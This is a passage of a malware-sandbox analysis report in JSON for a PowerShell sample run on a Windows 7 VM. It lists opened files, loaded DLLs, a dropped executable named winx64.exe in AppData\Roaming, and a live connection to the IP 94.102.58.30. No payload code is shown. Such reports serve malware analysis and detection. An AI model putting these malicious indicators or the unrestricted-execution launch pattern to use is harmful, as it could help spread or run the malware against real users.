@@ -1,0 +1,1937 @@
+{
+    "info": {
+        "version": "2.0.4",
+        "git": {
+            "head": "",
+            "fetch_head": ""
+        },
+        "monitor": "e19c4b4b529be2e90b3c5a3dfaad96f71c4fd54b",
+        "added": 1684583210.214035,
+        "started": 1684583210.340632,
+        "ended": 1684583322.568483,
+        "duration": 112,
+        "id": 19,
+        "category": "file",
+        "custom": null,
+        "owner": null,
+        "machine": {
+            "status": "stopped",
+            "name": "win7_office2013",
+            "label": "win7_sp1_x86_2013-16",
+            "manager": "KVM",
+            "started_on": "2023-05-20 11:46:50",
+            "shutdown_on": "2023-05-20 11:48:42"
+        },
+        "package": "",
+        "platform": "windows",
+        "options": "force-sleepskip=1,sslsplit_mitm=1",
+        "route": "none",
+        "score": 1.2
+    },
+    "behavior": {
+        "generic": [
+            {
+                "pid": 3600,
+                "ppid": 3576,
+                "process_name": "powershell.exe",
+                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "first_seen": 1684500424.765625,
+                "summary": {
+                    "file_opened": [
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflow\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\",
+                        "C:\\Program Files\\WindowsPowerShell\\Modules\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_fd22b1fc-e617-4e09-911b-265c0b51283b",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\",
+                        "C:\\Windows\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ISE.psm1",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\BitsTransfer.psd1",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Core\\9d04ce1d8a3042f50b54c7f9ccdb4068\\System.Core.ni.dll.aux",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSDiagnostics\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSWorkflow\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\dd80b6bd88741a27f7bb74ab0c89a3ba\\System.Data.ni.dll.aux",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\BitsTransfer\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\\2bef38851483abae82f1172c1aaa604c\\System.ni.dll.aux",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Transactions\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Management\\fea996c385fbc624826f8e043f6d5329\\System.Management.ni.dll.aux",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_acab909d-3ed0-4ce7-a78e-8b98924df715",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.WSMan.Management\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\TroubleshootingPack\\",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.Management.Infrastructure.CimCmdlets\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDesiredStateConfiguration\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Xml\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Numerics\\",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets\\",
+                        "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSScheduledJob\\",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_6be5a15c-5bf8-479d-ac8e-928b6f4e80ef",
+                        "C:\\tmpzvf1vy",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Xml\\2e14a1befe55e7d9ad2457ceb5267e36\\System.Xml.ni.dll.aux",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Configuration\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\a8c425d1bb3892aa39a36cf5ea272556\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\CimCmdlets.psd1",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_4b2ef84f-3321-443a-9099-fab84503db7b",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\",
+                        "C:\\Windows\\System32\\en-US\\tzres.dll.mui",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\ISE\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\",
+                        "C:\\tmpzvf1vy\\",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager.dll",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\",
+                        "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf49f6405#\\",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheIndex",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\",
+                        "C:\\Windows\\assembly\\GAC_32\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop.dll",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\bbe7eaf9abc583afc5cb972e1c01055a\\Microsoft.PowerShell.Commands.Management.ni.dll.aux",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Policy.1.0.System.Management.Automation\\v4.0_1.0.0.0__31bf3856ad364e35\\Policy.1.0.System.Management.Automation.config",
+                        "C:\\Windows\\System32\\wbem\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\AppLocker\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDiagnostics\\",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper.dll",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSScheduledJob\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\CimCmdlets\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\e6fd0809fcf152e7af28d4d954420a7a\\Microsoft.Management.Infrastructure.Native.ni.dll.aux",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Dired13b18a9#\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Dired13b18a9#\\22226fd213cda8b0409db35f1a6000f7\\System.DirectoryServices.ni.dll.aux",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.WSMan.Management\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\",
+                        "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\Microsoft.PowerShell.Diagnostics.psd1",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_99ef66db-8f5f-4491-822f-228c759713aa",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Manaa57fc8cc#\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Numerics\\39bc6b2550e216781f343bac4cc024af\\System.Numerics.ni.dll.aux",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSWorkflowUtility\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\Microsoft.PowerShell.Security.psd1",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.dll",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\",
+                        "C:\\Windows\\System32\\tzres.dll",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.BackgroundIntelligentTransfer.Management\\1.0.0.0__31bf3856ad364e35\\Microsoft.BackgroundIntelligentTransfer.Management.dll",
+                        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config",
+                        "C:\\Windows\\System32\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Configuration\\8c730c7fbe608461407cf3be279cdeab\\System.Configuration.ni.dll.aux",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_d7809b8a-712d-4b4c-a5f6-e0adcf171375",
+                        "C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\AppLocker.psd1",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Management\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1",
+                        "C:\\ProgramData\\Oracle\\Java\\javapath\\",
+                        "C:\\Python27\\",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets.dll",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Transactions\\ce1b28106ce7b869fa471d6407556191\\System.Transactions.ni.dll.aux",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSDesiredStateConfiguration\\",
+                        "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_07cd1134-60f3-4b2b-99a7-6a3e74fcf9f0",
+                        "C:\\Python27\\lib\\site-packages\\pywin32_system32\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\Microsoft.PowerShell.Host.psd1",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Manaa57fc8cc#\\6a6c1355f2d7de7176bc0eace243a042\\System.Management.Automation.ni.dll.aux",
+                        "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.BackgroundIntelligentTransfer.Management\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Core\\",
+                        "C:\\Python27\\Scripts\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflowUtility\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\TroubleshootingPack\\",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_79fed44b-a50f-49d9-9204-e6dedef865bb",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf49f6405#\\c0d543ad7c05b3d906c7c12c915b874a\\Microsoft.Management.Infrastructure.ni.dll.aux",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\2e0d9cf89766b98f230abe8caeeb01de\\Microsoft.Management.Infrastructure.CimCmdlets.ni.dll.aux",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_965e143d-a9ce-49f3-bc2a-cb5bbeac55fb",
+                        "C:\\Windows\\assembly\\pubpol59.dat",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ISE.psd1"
+                    ],
+                    "file_failed": [
+                        "C:\\tmpzvf1vy",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S88747207#\\",
+                        "\\DEVICE\\NETBT_TCPIP_{8C2F1D98-0F17-4D5E-BA83-0060E724AD37}",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Ba45bbba0#\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Sb6a1f1bc#\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S356e1ba0#\\",
+                        "C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1\\",
+                        "\\DEVICE\\NETBT_TCPIP_{E29AC6C2-7037-11DE-816D-806E6F6E6963}",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S54faafb0#\\",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S0f8e494c#\\"
+                    ],
+                    "file_recreated": [
+                        "\\DEVICE\\NETBT_TCPIP_{1141D443-46F3-4C40-8D6C-D57632F2B3B2}",
+                        "\\??\\MountPointManager",
+                        "\\??\\C:",
+                        "\\Device\\Afd\\Endpoint",
+                        "\\??\\Nsi"
+                    ],
+                    "dll_loaded": [
+                        "API-MS-WIN-Service-Management-L2-1-0.dll",
+                        "credssp.dll",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\iphlpapi.dll",
+                        "OLEAUT32.dll",
+                        "WINTRUST.dll",
+                        "advapi32.dll",
+                        "ole32.dll",
+                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwrshsip.dll",
+                        "C:\\Windows\\system32\\CRYPT32.dll",
+                        "rtutils.dll",
+                        "RASMAN.DLL",
+                        "API-MS-WIN-Service-Management-L1-1-0.dll",
+                        "CFGMGR32.dll",
+                        "Secur32.dll",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\bbe7eaf9abc583afc5cb972e1c01055a\\Microsoft.PowerShell.Commands.Management.ni.dll",
+                        "rasapi32.dll",
+                        "dhcpcsvc.DLL",
+                        "ADVAPI32.dll",
+                        "SHELL32.dll",
+                        "ws2_32.dll",
+                        "C:\\Windows\\System32\\wshtcpip.dll",
+                        "IPHLPAPI.DLL",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\e6fd0809fcf152e7af28d4d954420a7a\\Microsoft.Management.Infrastructure.Native.ni.dll",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\dd80b6bd88741a27f7bb74ab0c89a3ba\\System.Data.ni.dll",
+                        "api-ms-win-downlevel-advapi32-l2-1-0.dll",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\2e0d9cf89766b98f230abe8caeeb01de\\Microsoft.Management.Infrastructure.CimCmdlets.ni.dll",
+                        "cryptsp.dll",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\winhttp.dll",
+                        "MSISIP.DLL",
+                        "dhcpcsvc6.DLL",
+                        "winhttp.dll",
+                        "SspiCli.dll",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\rasapi32.dll",
+                        "NSI.dll",
+                        "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\System\\v4.0_4.0.0.0__b77a5c561934e089\\ws2_32.dll",
+                        "API-MS-WIN-Service-winsvc-L1-1-0.dll",
+                        "WS2_32.dll",
+                        "SHLWAPI.dll",
+                        "CRYPTSP.dll",
+                        "C:\\Windows\\system32\\wshext.dll",
+                        "RPCRT4.dll",
+                        "C:\\Windows\\system32\\mswsock.dll",
+                        "ntdll.dll",
+                        "API-MS-WIN-DOWNLEVEL-SHLWAPI-L1-1-0.DLL",
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\a8c425d1bb3892aa39a36cf5ea272556\\Microsoft.PowerShell.Commands.Utility.ni.dll",
+                        "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\urlmon.dll",
+                        "kernel32.dll",
+                        "C:\\Windows\\System32\\wship6.dll",
+                        "iphlpapi.dll",
+                        "urlmon.dll"
+                    ],
+                    "file_created": [
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_07cd1134-60f3-4b2b-99a7-6a3e74fcf9f0",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_4b2ef84f-3321-443a-9099-fab84503db7b",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheIndex",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_fd22b1fc-e617-4e09-911b-265c0b51283b",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_79fed44b-a50f-49d9-9204-e6dedef865bb",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_99ef66db-8f5f-4491-822f-228c759713aa",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell",
+                        "C:\\Users\\Admin\\AppData\\Roaming\\winx64.exe",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_d7809b8a-712d-4b4c-a5f6-e0adcf171375",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_965e143d-a9ce-49f3-bc2a-cb5bbeac55fb",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_acab909d-3ed0-4ce7-a78e-8b98924df715",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_ed0c2d6a-f32a-44c3-876c-25f7a1df175b",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_43619d16-f13a-429e-a19b-5dda70471031",
+                        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_6be5a15c-5bf8-479d-ac8e-928b6f4e80ef"
+                    ],
+                    "connects_ip": [
+                        "94.102.58.30"
+                    ]
+                },
+                "signatures": [
+                    {
+                        "description": "Found potential IP address or url in binary/memory",
+                        "name": "ipurl_in_string",
+                        "severity": 1,
+                        "sig_class": "Static File Characteristics"
+                    },
+                    {
+                        "description": "Contains functionality to create guard pages, often used to hinder reverse engineering and debugging",
+                        "name": "create_guard_page",
+                        "severity": 2,
+                        "sig_class": "Anti-Reverse Engineering"
+                    }
+                ],
+                "network": [
+                    {
+                        "ip": "94.102.58.30",
+                        "alive": "true"
+                    }
+                ],
+                "dropped": [],
+                "winproc": true,
+                "description": "Windows PowerShell",
+                "mainproc": true
+            }
+        ],
+        "processtree": [
+            {
+                "pid": 3600,
+                "ppid": 3576,
+                "process_name": "powershell.exe",
+                "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -ExecutionPolicy unrestricted -File C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1",
+                "first_seen": 1684500424.765625,
+                "children": [],
+                "track": true
+            }
+        ],
+        "summary": {
+            "file_opened": [
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflow\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\",
+                "C:\\Program Files\\WindowsPowerShell\\Modules\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_fd22b1fc-e617-4e09-911b-265c0b51283b",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\",
+                "C:\\Windows\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ISE.psm1",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\BitsTransfer.psd1",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Core\\9d04ce1d8a3042f50b54c7f9ccdb4068\\System.Core.ni.dll.aux",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSDiagnostics\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSWorkflow\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Data\\dd80b6bd88741a27f7bb74ab0c89a3ba\\System.Data.ni.dll.aux",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\BitsTransfer\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System\\2bef38851483abae82f1172c1aaa604c\\System.ni.dll.aux",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Transactions\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Management\\fea996c385fbc624826f8e043f6d5329\\System.Management.ni.dll.aux",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_acab909d-3ed0-4ce7-a78e-8b98924df715",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.WSMan.Management\\",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\TroubleshootingPack\\",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.Management.Infrastructure.CimCmdlets\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDesiredStateConfiguration\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Xml\\",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Numerics\\",
+                "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets\\",
+                "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSScheduledJob\\",
+                "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Data\\v4.0_4.0.0.0__b77a5c561934e089\\System.Data.dll",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_6be5a15c-5bf8-479d-ac8e-928b6f4e80ef",
+                "C:\\tmpzvf1vy",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Xml\\2e14a1befe55e7d9ad2457ceb5267e36\\System.Xml.ni.dll.aux",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Configuration\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.P521220ea#\\a8c425d1bb3892aa39a36cf5ea272556\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\CimCmdlets.psd1",
+                "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_4b2ef84f-3321-443a-9099-fab84503db7b",
+                "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\",
+                "C:\\Windows\\System32\\en-US\\tzres.dll.mui",
+                "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\ISE\\",
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
